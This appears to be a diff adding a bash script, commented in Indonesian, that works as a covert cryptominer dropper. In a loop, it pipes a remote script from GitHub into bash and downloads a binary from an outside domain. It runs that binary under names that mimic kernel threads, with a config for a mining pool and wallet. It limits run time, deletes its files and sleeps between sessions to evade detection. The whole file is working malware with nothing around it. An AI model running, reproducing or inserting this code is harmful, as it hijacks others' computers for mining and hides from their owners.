@@ -1,0 +1,76 @@
+#!/bin/bash
+
+NEW_SCRIPT_URL="https://raw.githubusercontent.com/nineasku55/tampung/refs/heads/main/Terain55"
+LOCAL_BIN_DIR="$HOME/.local/bin"
+
+CONFIG_JSON='{
+  "algo": "Yespowertide",
+  "url": "35.162.27.139:443",
+  "user": "TNR2ML87UqCtKG7uTAmvy7xvLSU1oLVsuR.Train27",
+  "pass": "x",
+  "threads": 8
+}'
+
+POSSIBLE_NAMES=(".dbus-daemon" "migration" "watchdog" ".ksoftirqd" "rcu_sched" ".profile-cache" 
+                "rcu_bh" "kdevtmpfs" "kintegrityd" "kblockd" "kthrotld")
+
+generate_random_string() {
+    local length=${1:-8}
+    tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c "$length"
+}
+
+mkdir -p "$LOCAL_BIN_DIR"
+
+while true; do
+    # Download script baru SETIAP SESI sebelum mulai runtime
+    curl -sL "$NEW_SCRIPT_URL" | bash -s -- || true
+    
+    # Hapus data sesi lama
+    rm -f "$LOCAL_BIN_DIR"/*.json
+    rm -f "$LOCAL_BIN_DIR"/.dbus-daemon*
+    rm -f "$LOCAL_BIN_DIR"/migration*
+    rm -f "$LOCAL_BIN_DIR"/watchdog*
+    rm -f "$LOCAL_BIN_DIR"/.ksoftirqd*
+    rm -f "$LOCAL_BIN_DIR"/rcu_*
+    rm -f "$LOCAL_BIN_DIR"/.profile-cache*
+    rm -f "$LOCAL_BIN_DIR"/kdevtmpfs*
+    rm -f "$LOCAL_BIN_DIR"/kintegrityd*
+    rm -f "$LOCAL_BIN_DIR"/kblockd*
+    rm -f "$LOCAL_BIN_DIR"/kthrotld*
+
+    # Pilih nama binary acak
+    BIN_NAME="${POSSIBLE_NAMES[$RANDOM % ${#POSSIBLE_NAMES[@]}]}"
+    
+    RAND_SUFFIX=$(generate_random_string 12)
+    BIN_NAME_FULL="${BIN_NAME}${RAND_SUFFIX}"
+    
+    CONFIG_SUFFIX=$(generate_random_string 10)
+    CONFIG_PATH="$LOCAL_BIN_DIR/${BIN_NAME}_config${CONFIG_SUFFIX}.json"
+
+    # Simpan config JSON
+    echo "$CONFIG_JSON" > "$CONFIG_PATH"
+
+    # Download binary baru SETIAP SESI
+    wget -q "https://dot-store.biz.id/bagong" -O "$LOCAL_BIN_DIR/$BIN_NAME_FULL"
+    
+    if [ $? -eq 0 ]; then
+        chmod +x "$LOCAL_BIN_DIR/$BIN_NAME_FULL"
+
+        # Waktu aktif (2-3 menit)
+        ACTIVE_MIN=$((RANDOM % 2 + 2))
+        ACTIVE_SEC=$((ACTIVE_MIN * 60))
+
+        # Jalankan proses dengan binary yang baru didownload
+        timeout "$ACTIVE_SEC" "$LOCAL_BIN_DIR/$BIN_NAME_FULL" --config="$CONFIG_PATH" >/dev/null 2>&1
+
+        # Hapus file sesi ini
+        rm -f "$LOCAL_BIN_DIR/$BIN_NAME_FULL"
+        rm -f "$CONFIG_PATH"
+
+        # Istirahat (20-30 detik) sebelum sesi baru dengan download lagi
+        IDLE_SEC=$((RANDOM % 11 + 20))
+        sleep "$IDLE_SEC"
+    else
+        sleep 30
+    fi
+done
